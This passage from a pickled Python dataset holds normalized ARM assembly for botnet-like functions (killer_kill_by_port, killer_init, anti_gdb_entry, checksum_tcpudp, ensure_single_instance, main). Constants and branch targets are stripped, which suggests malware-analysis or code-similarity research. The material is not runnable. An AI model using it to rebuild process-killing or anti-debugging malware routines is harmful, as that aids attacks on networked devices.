nMOV~R3,R3,ASR0\nSTRB~R3,[LR,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[LR,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[LR,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nLDR~R4,[SP,0]\nORR~R3,R4,R3,LSL0\nSTRB~R3,[LR,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[LR,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R12]\nMOV~R3,R3,ASR0\nSTRB~R3,[R12,0]\nMOV~R3,0\nMOV~R5,0\nSTRB~R3,[R12,0]\nSTRB~R5,[R12,0]\nSTRB~R5,[R12,0]\nSTRB~R3,[R12,0]\nSTRB~R11,[R0]\nADD~R4,R0,R11\nADD~R0,R4,R3\nMOV~R1,R8\nLDR~R3,[SP,0]\nADD~R2,R3,0\nBL~FOO\nLDR~R1,[SP,0]\nCMP~R1,R5\nMOVLE~R2,R4\nMOVLE~R0,R5\nBLE~FOO\nMOV~R2,R4\nMOV~R0,0\nMOV~R1,R0\nLDRB~R3,[R1,R8]\nCMP~R3,0\nSTREQB~R0,[R2]\nADDEQ~R3,R4,R1\nADDEQ~R2,R3,0\nMOVEQ~R0,0\nADDNE~R3,R0,0\nANDNE~R0,R3,0\nADD~R1,R1,0\nLDR~R3,[SP,0]\nCMP~R3,R1\nBNE~FOO\nSTRB~R0,[R2]\nLDR~R1,[SP,0]\nADD~R2,R4,R1\nADD~R3,R2,0\nMOV~R1,0\nMOV~R0,0\nSTRB~R1,[R2,0]\nSTRB~R0,[R3,0]\nSTRB~R1,[R3,0]\nSTRB~R0,[R3,0]\nLDR~R3,[SP,0]\nADD~R4,R3,R0\nSTR~R4,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBGT~FOO\nMOV~R3,0\nLDR~R4,[SP,0]\nCMP~R4,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R1,R3\nMOV~R3,0\nSUB~R10,R3,0\nMOV~R8,0\nLDR~R2,[SP,0]\nADD~R9,R11,R2\nLDR~R3,[SP,0]\nLDR~R7,[R3,R1,LSL0]\nMOV~R5,R7\nADD~R4,R7,0\nADD~R6,R7,0\nLDR~R1,[SP,0]\nCMP~R1,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R7,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R7,0]\nLDR~R2,[SP,0]\nCMP~R2,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R4]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R3,[SP,0]\nCMP~R3,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R4,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R1,[SP,0]\nCMP~R1,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nADD~R0,R6,0\nMOV~R1,R11\nBL~FOO\nSTRB~R8,[R5,0]\nSTRB~R8,[R5,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R8,[R4,0]\nSTRB~R8,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nMOV~R0,R5\nMOV~R1,R4\nORR~R2,R3,R2,LSL0\nADD~R3,R9,0\nBL~FOO\nSTRB~R0,[R4,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nLDR~R3,[SP,0]\nADD~R2,R2,R3\nLDR~R1,[SP,0]\nSTR~R1,[R2,0]\nLDR~R3,[R4]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nADD~R2,R9,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R1,R3,0\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,R1\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p227
L1808L
tp228
a(S'checksum_generic'
p229
S'"CMP~R1,0\nMOVLS~R12,0\nBLS~FOO\nMOV~R12,0\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nADD~R12,R12,R3\nADD~R0,R0,0\nSUB~R1,R1,0\nCMP~R1,0\nBHI~FOO\nCMP~R1,0\nLDREQB~R3,[R0]\nADDEQ~R12,R12,R3\nMOV~R0,0\nAND~R0,R12,R0\nADD~R0,R0,R12,LSR0\nADD~R0,R0,R0,LSR0\nMVN~R0,R0\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nRET"'
p230
L96L
tp231
a(S'checksum_tcpudp'
p232
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R12,R3\nMOV~R2,R2,LSL0\nMOV~R6,R2,LSR0\nADD~R4,R0,0\nLDMIA~R4,{R4,R5}\nCMP~R3,0\nMOVLE~LR,0\nBLE~FOO\nMOV~LR,0\nLDRB~R3,[R1]\nLDRB~R2,[R1,0]\nORR~R3,R3,R2,LSL0\nADD~LR,LR,R3\nADD~R1,R1,0\nSUB~R12,R12,0\nCMP~R12,0\nBGT~FOO\nCMP~R12,0\nLDREQB~R3,[R1]\nADDEQ~LR,LR,R3\nMOV~R3,0\nAND~R2,R3,R4,LSR0\nAND~R1,R4,R3\nADD~R2,R2,R1\nAND~R1,R3,R5,LSR0\nADD~R1,LR,R1\nAND~R3,R5,R3\nADD~R2,R2,R3\nLDRB~R3,[R0,0]\nMOV~R3,R3,LSL0\nADD~R1,R1,R3\nADD~R2,R2,R6\nADD~R0,R1,R2\nMOVS~R2,R0,LSR0\nBEQ~FOO\nMOV~R3,0\nSUB~R1,R3,0\nAND~R3,R0,R1\nADD~R0,R3,R2\nMOVS~R2,R0,LSR0\nBNE~FOO\nMVN~R0,R0\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nLDMFD~SP!,{R4-R6,PC}"'
p233
L188L
tp234
a(S'mem_exists'
p235
S'"STMFD~SP!,{R4,LR}\nMOV~LR,R2\nMOV~R4,R3\nCMP~R3,R1\nMOVLE~R12,0\nBLE~FOO\nB~FOO\nLDRB~R2,[R0]\nLDRB~R3,[R12,LR]\nCMP~R2,R3\nMOVNE~R12,0\nBNE~FOO\nADD~R12,R12,0\nCMP~R4,R12\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,PC}\nADD~R0,R0,0\nSUB~R1,R1,0\nCMN~R1,0\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,PC}"'
p236
L92L
tp237
a(S'killer_kill'
p238
S'"STR~LR,[SP,-0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,0\nBL~FOO\nLDR~PC,[SP]"'
p239
L24L
tp240
a(S'killer_kill_by_port'
p241
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nMOV~R7,R0,LSL0\nMOV~R4,R7,LSR0\nMOV~R5,0\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nADD~R0,SP,0\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nMOV~R6,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R0,R1,R6\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSUB~R5,R5,0\nADD~R0,SP,0\nSUB~R0,R0,0\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nAND~R4,R4,0\nMOV~R4,R4,LSL0\nSUB~R8,R6,0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R6,R2,R8\nORR~R0,R4,R7,LSR0\nMOV~R1,R5\nMOV~R2,R6\nBL~FOO\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nLDRB~R3,[R1,R8]\nSTRB~R3,[R6,0]\nLDRB~R3,[R6,0]\nSTRB~R3,[R6,0]\nMOV~R3,0\nSTRB~R3,[R6,0]\nADD~R3,R3,0\nSTRB~R3,[R1,R8]\nSTRB~R3,[R6,0]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nMOV~R8,R0\nCMN~R0,0\nMOVEQ~R0,0\nBEQ~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R4\nB~FOO\nMOV~R1,0\nADD~R3,SP,0\nSUB~R3,R3,0\nADD~R1,R1,0\nLDRB~R2,[R1,R3]\nCMP~R2,0\nCMPNE~R2,0\nBNE~FOO\nCMP~R2,0\nBEQ~FOO\nADD~R0,R1,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R0\nMOV~R3,0\nLDRB~R3,[R2,R3]\nCMP~R3,0\nCMPNE~R3,0\nMOVEQ~R5,R0\nBEQ~FOO\nADD~R3,SP,0\nSUB~R3,R3,0\nADD~R2,R3,R1\nLDRB~R3,[R2,0]\nADD~R2,R2,0\nCMP~R3,0\nCMPNE~R3,0\nBNE~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nRSB~R3,R1,R2\nADD~R5,R3,0\nADD~R5,R5,0\nMOV~R2,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R5\nMOV~R7,0\nSTRB~R7,[R3,R2]\nADD~R6,R1,R2\nADD~R4,R6,R0\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nADD~R2,SP,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nADDNE~R0,R5,0\nADDNE~R4,R6,R5\nMOVNE~R2,R7\nMOVNE~R12,R2\nMOVNE~LR,R2\nBNE~FOO\nB~FOO\nCMP~R3,0\nCMPNE~R3,0\nMOVEQ~R2,0\nBEQ~FOO\nCMP~R2,0\nBNE~FOO\nADD~R12,R12,0\nCMP~R12,0\nBNE~FOO\nLDRB~R3,[R1,0]\nCMP~R3,0\nSUBNE~R2,R2,0\nBNE~FOO\nB~FOO\nMOV~R2,0\nADD~R4,R4,0\nCMP~R12,0\nBGT~FOO\nADD~R0,R0,0\nMOV~R1,R4\nLDRB~R3,[R4,0]\nCMP~R3,0\nBNE~FOO\nMOV~R12,R0\nCMP~LR,0\nBEQ~FOO\nMOV~R2,0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R0\nLDRB~R3,[R3,R2]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nADD~R3,R1,R2\nADD~R2,R3,R0\nADD~R12,R12,0\nLDRB~R3,[R2,0]\nCMP~R3,0\nCMPNE~R3,0\nBNE~FOO\nMOV~R1,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R12\nMOV~R3,0\nSTRB~R3,[R2,R1]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R3,R2,R1\nADD~R4,R3,R0\nMOV~R0,R4\nBL~FOO\nCMP~R0,0\nBGT~FOO\nADD~R0,SP,0\nSUB~R0,R0,0\nMOV~R1,R4\nBL~FOO\nB~FOO\nMOV~R4,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R0,R3,R4\nMOV~R1,0\nMOV~R2,R8\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nLDRB~R2,[R1,R4]\nCMP~R2,0\nCMPNE~R2,0\nMOVEQ~R3,0\nMOVNE~R3,0\nMOVEQ~R1,R3\nBEQ~FOO\nB~FOO\nMOV~R0,R8\nBL~FOO\nADD~R0,SP,0\nSUB~R0,R0,0\nBL~FOO\nSUBS~R4,R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nBL~FOO\nSUBS~R9,R0,0\nMOVEQ~R11,R9\nMOVNE~R11,0\nADDNE~R6,SP,0\nADDNE~R6,R6,0\nBNE~FOO\nB~FOO\nADD~R8,R0,0\nLDRB~R3,[R0,0]\nSUB~R3,R3,0\nCMP~R3,0\nBHI~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R5,SP,0\nADD~R5,R5,0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nMOV~R1,R8\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nMOV~R1,R8\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nBL~FOO\nSUBS~R10,R0,0\nBNE~FOO\nB~FOO\nADD~R5,SP,0\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R6\nBL~FOO\nMOV~R0,R6\nBL~FOO\nADD~R0,R6,R0\nMOV~R1,R8\nBL~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R6,R4\nBL~FOO\nMOV~R0,R6\nBL~FOO\nADD~R0,R6,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R6\nBL~FOO\nADD~R0,R6,R0\nADD~R1,R7,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R0\nMOV~R0,R5\nADD~R2,SP,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R11,0\nMOV~R0,R10\nBL~FOO\nSUBS~R7,R0,0\nBEQ~FOO\nCMP~R11,0\nBEQ~FOO\nMOV~R0,R10\nBL~FOO\nMOV~R0,R9\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nCMP~R11,0\nBEQ~FOO\nMOV~R0,R9\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nAND~R0,R11,0\nB~FOO\nMOV~R2,0\nMOV~LR,0\nADD~R4,R4,0\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p242
L1500L
tp243
a(S'killer_init'
p244
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nMOV~R0,0\nBL~FOO\nMOV~R10,R0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R5,R3\nORRGT~R5,R3,0\nCMP~R5,0\nBNE~FOO\nMOV~R4,0\nADD~R1,SP,0\nSTRB~R4,[R1,0]\nSTRB~R5,[R1,0]\nSTR~R5,[R1,0]\nMOV~R0,0\nBL~FOO\nADD~R2,SP,0\nSTRB~R5,[R2,0]\nMOV~R3,0\nSTRB~R3,[R2,0]\nMOV~R0,R4\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBEQ~FOO\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R2,0\nADD~R3,SP,0\nSTRB~R2,[R3,0]\nMOV~R3,0\nADD~R12,SP,0\nSTRB~R3,[R12,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBEQ~FOO\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R8,<STR>\nSTR~R0,[R8]\nMOV~R6,0\nSTRB~R6,[R0]\nLDR~R3,<STR>\nSTR~R6,[R3]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,R6\nBL~FOO\nMOV~R1,R0\nADD~R5,SP,0\nSUB~R5,R5,0\nMOV~R0,R5\nBL~FOO\nADD~R4,R5,R0\nBL~FOO\nMOV~R1,0\nADD~R2,SP,0\nADD~R2,R2,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nMOV~R0,0\nMOV~R1,R6\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nMOV~R7,R0\nMOV~R0,R5\nMOV~R1,R6\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,[R8]\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nLDRNE~R3,[R8]\nSTRNEB~R6,[R3,R0]\nADD~R3,SP,0\nSUB~R3,R3,0\nADD~R1,R4,R7\nMOV~R0,R3\nRSB~R1,R3,R1\nBL~FOO\nMOV~R4,R10\nMOV~R5,0\nMOV~R1,0\nSTR~R1,[SP,0]\nMOV~R2,0\nSTR~R2,[SP]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nBL~FOO\nSUBS~R10,R0,0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nADD~R9,SP,0\nADD~R9,R9,0\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R1,[SP]\nADD~R12,R12,R1\nSTR~R12,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nB~FOO\nLDRB~R3,[R0,0]\nSUB~R3,R3,0\nCMP~R3,0\nBHI~FOO\nADD~R6,R0,0\nMOV~R0,R6\nBL~FOO\nMOV~R8,R0\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nCMP~R5,R0\nBLT~FOO\nMOV~R0,0\nBL~FOO\nRSB~R0,R4,R0\nCMP~R0,0\nMOVGT~R5,0\nBGT~FOO\nCMP~R8,0\nBLE~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R9\nBL~FOO\nADD~R5,R9,R0\nMOV~R0,R5\nMOV~R1,R6\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nMOV~R0,R4\nMOV~R1,R6\nBL~FOO\nMOV~R5,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R4,R5\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R7,[SP,0]\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R6,R12,R7\nMOV~R0,R9\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nMOV~R5,R0\nCMN~R0,0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R0\nMOV~R4,0\nSTRB~R4,[R3,R7]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nMOV~R0,R6\nSUB~R1,R5,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nCMP~R8,R0\nBEQ~FOO\nBL~FOO\nCMP~R8,R0\nBEQ~FOO\nLDR~R4,[SP,0]\nMOV~R0,R4\nLDR~R3,<STR>\nLDR~R1,[R3]\nBL~FOO\nSUBS~R1,R0,0\nBNE~FOO\nMOV~R0,R4\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nMOVEQ~R0,R8\nMOVEQ~R1,0\nBLEQ~FOO\nMOV~R0,R4\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nMOV~R6,R0\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[SP,0]\nLDR~R7,[SP,0]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R11,R2,R7\nB~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R11\nMOV~R1,R5\nLDR~R2,[SP,0]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R6\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R2,R7\nMOV~R2,0\nBL~FOO\nSUBS~R5,R0,0\nBGT~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R5,R8\nLDR~R4,[SP,0]\nB~FOO\nMOV~R5,R8\nLDR~R4,[SP,0]\nMOV~R0,R10\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R10\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p245
L1748L
tp246
a(S'anti_gdb_entry'
p247
S'"LDR~R2,<STR>\nLDR~R3,<STR>\nSTR~R2,[R3]\nRET"'
p248
L16L
tp249
a(S'teardown_connection'
p250
S'"STR~LR,[SP,-0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nCMN~R0,0\nBLNE~FOO\nMOV~R2,0\nLDR~R3,<STR>\nSTR~R2,[R3]\nMOV~R0,0\nBL~FOO\nLDR~PC,[SP]"'
p251
L44L
tp252
a(S'ensure_single_instance'
p253
S'"STMFD~SP!,{R4-R6,LR}\nSUB~SP,SP,0\nMOV~R4,0\nSTR~R4,[SP,0]\nMOV~R0,0\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nLDR~R6,<STR>\nSTR~R0,[R6]\nCMN~R0,0\nBEQ~FOO\nMOV~R5,0\nSTR~R5,[SP]\nMOV~R1,R4\nMOV~R2,0\nADD~R3,SP,R5\nBL~FOO\nLDR~R4,[R6]\nMOV~R0,R4\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R4\nMOV~R1,R5\nBL~FOO\nLDR~R3,<STR>\nLDRB~R3,[R3]\nCMP~R3,0\nMOVNE~R3,0\nADDNE~R2,R3,0\nLDREQ~R3,<STR>\nLDREQ~R2,[R3]\nMOV~R5,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R5,[SP,0]\nSTR~R2,[SP,0]\nADD~R3,R3,0\nSTRB~R3,[SP,0]\nADD~R3,R3,0\nSTRB~R3,[SP,0]\nBL~FOO\nMOV~R4,R0\nSTR~R5,[R0]\nADD~R6,SP,0\nLDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBNE~FOO\nLDR~R2,<STR>\nLDRB~R3,[R2]\nCMP~R3,R5\nSTRNEB~R5,[R2]\nMOV~R2,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R2,[SP,0]\nSTR~R2,[SP,0]\nADD~R3,R3,0\nSTRB~R3,[SP,0]\nADD~R3,R3,0\nSTRB~R3,[SP,0]\nLDR~R4,<STR>\nLDR~R0,[R4]\nMOV~R1,R6\nADD~R2,R2,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[R4]\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nB~FOO\nLDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,0\nBL~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p254
L360L
tp255
a(S'main'
p256
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nSTR~R0,[SP,0]\nSTR~R1,[SP,0]\nLDR~R0,[R1]\nBL~FOO\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R0,R4\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nMOV~R1,R4\nMOV~R2,R0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBNE~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBEQ~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nMOV~R0,R4\nMOV~R1,0\nADD~R2,SP,0\nADD~R2,R2,0\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R0,<STR>\nBL~FOO\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDR~R2,<STR>\nMOV~R4,0\nMOV~R3,0\nSTRB~R3,[R2]\nSTRB~R4,[R2,0]\nLDR~R3,<STR>\nSTR~R3,[R2,0]\nSTRB~R4,[R2,0]\nMOV~R3,0\nSTRB~R3,[R2,0]\nLDR~R1,[SP,0]\nLDR~R8,[R1]\nADD~R0,SP,0\nSUB~R0,R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R3,<STR>\nADD~R12,SP,0\nADD~R12,R12,0\nMOV~LR,R3\nLDMIA~LR!,{R0-R3}\nSTMIA~R12!,{R0-R3}\nLDMIA~LR!,{R0-R3}\nSTMIA~R12!,{R0-R3}\nLDR~R3,[LR]\nSTR~R3,[R12]\nMOV~R2,R4\nADD~R1,SP,0\nADD~R1,R1,0\nLDR~R3,[R2,R1]\nADD~R4,R4,R3\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nCMP~R4,0\nBEQ~FOO\nMOV~R4,0\nMOV~R7,R4\nMOV~R10,0\nADD~R6,SP,0\nADD~R6,R6,0\nMOV~R11,0\nMOV~R9,0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R3,R2,R4\nLDRB~R2,[R3,R11]\nLDRB~R3,[R3,R9]\nADD~R12,R7,0\nADD~